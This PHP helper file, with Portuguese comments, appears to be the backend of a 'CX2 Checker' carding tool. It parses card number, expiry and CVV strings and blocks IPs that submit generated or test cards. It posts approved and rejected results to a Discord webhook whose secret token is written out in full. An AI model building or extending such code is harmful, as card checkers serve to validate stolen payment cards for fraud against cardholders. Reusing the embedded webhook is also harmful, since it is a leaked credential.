<?php
// Configuração de Webhook Discord
define('WEBHOOK_URL', 'https://discord.com/api/webhooks/1449051729449451701/Z0QECTtV8XQeVJRusaxWeiGagLv5inV4ZedE4WHVthYsVOWaEQX9FhbRPICAR9ryii36');

// Arquivo para armazenar IPs bloqueados
define('BLOCKED_IPS_FILE', __DIR__ . '/blocked_ips.json');

// Arquivo para armazenar tentativas de GG por IP
define('GG_ATTEMPTS_FILE', __DIR__ . '/gg_attempts.json');

// Limite de tentativas com GG antes de bloquear
define('GG_ATTEMPT_LIMIT', 3);

// Função para obter IP do cliente
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Função para verificar se IP está bloqueado
function isIPBlocked($ip) {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        return false;
    }
    
    $blocked_ips = json_decode(file_get_contents(BLOCKED_IPS_FILE), true);
    return in_array($ip, $blocked_ips ?? []);
}

// Função para bloquear IP
function blockIP($ip, $reason = 'GG Attempts') {
    $blocked_ips = [];
    
    if (file_exists(BLOCKED_IPS_FILE)) {
        $blocked_ips = json_decode(file_get_contents(BLOCKED_IPS_FILE), true) ?? [];
    }
    
    if (!in_array($ip, $blocked_ips)) {
        $blocked_ips[] = [
            'ip' => $ip,
            'reason' => $reason,
            'blocked_at' => date('Y-m-d H:i:s'),
            'timestamp' => time()
        ];
        
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blocked_ips, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    }
}

// Função para registrar tentativa de GG
function recordGGAttempt($ip, $card) {
    $attempts = [];
    
    if (file_exists(GG_ATTEMPTS_FILE)) {
        $attempts = json_decode(file_get_contents(GG_ATTEMPTS_FILE), true) ?? [];
    }
    
    if (!isset($attempts[$ip])) {
        $attempts[$ip] = [];
    }
    
    $attempts[$ip][] = [
        'card' => $card,
        'timestamp' => date('Y-m-d H:i:s'),
        'unix_time' => time()
    ];
    
    file_put_contents(GG_ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    
    // Verificar se atingiu o limite
    if (count($attempts[$ip]) >= GG_ATTEMPT_LIMIT) {
        blockIP($ip, 'GG Attempts Limit Exceeded');
        return true;
    }
    
    return false;
}

// Função para detectar cartão gerado (GG)
function isGeneratedCard($cc) {
    // Padrões comuns de cartões gerados
    $patterns = [
        '/^(\d)\1{15}$/', // Todos os dígitos iguais (ex: 4444444444444444)
        '/^4111111111111111$/', // Cartão de teste Visa
        '/^5555555555554444$/', // Cartão de teste Mastercard
        '/^378282246310005$/', // Cartão de teste Amex
        '/^6011111111111117$/', // Cartão de teste Discover
        '/^3530111333300000$/', // Cartão de teste JCB
        '/^3566002020360505$/', // Cartão de teste JCB
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $cc)) {
            return true;
        }
    }
    
    return false;
}

// Função para validar formato do cartão
function validateCardFormat($card_data) {
    $parts = explode('|', trim($card_data));
    
    if (count($parts) !== 4) {
        return [
            'valid' => false,
            'error' => 'FORMATO INCORRETO'
        ];
    }
    
    $cc = $parts[0];
    $mes = $parts[1];
    $ano = $parts[2];
    $cvv = $parts[3];
    
    // Validar número do cartão (16-19 dígitos)
    if (!preg_match('/^\d{16,19}$/', $cc)) {
        return [
            'valid' => false,
            'error' => 'FORMATO INCORRETO'
        ];
    }
    
    // Validar mês (01-12)
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $mes)) {
        return [
            'valid' => false,
            'error' => 'FORMATO INCORRETO'
        ];
    }
    
    // Validar ano (2 ou 4 dígitos)
    if (!preg_match('/^\d{2,4}$/', $ano)) {
        return [
            'valid' => false,
            'error' => 'FORMATO INCORRETO'
        ];
    }
    
    // Validar CVV (3-4 dígitos)
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        return [
            'valid' => false,
            'error' => 'FORMATO INCORRETO'
        ];
    }
    
    return [
        'valid' => true,
        'cc' => $cc,
        'mes' => $mes,
        'ano' => $ano,
        'cvv' => $cvv
    ];
}

// Função para enviar para Discord
function sendToDiscord($message, $is_approved = true) {
    $webhook_url = WEBHOOK_URL;
    
    // Cores: Verde para aprovados, Vermelho para rejeitados
    $color = $is_approved ? 3066993 : 15158332; // Verde: 3066993, Vermelho: 15158332
    
    $data = [
        'embeds' => [
            [
                'description' => $message,
                'color' => $color,
                'timestamp' => date('c'),
                'footer' => [
                    'text' => 'CX2 Checker'
                ]
            ]
        ]
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

?>
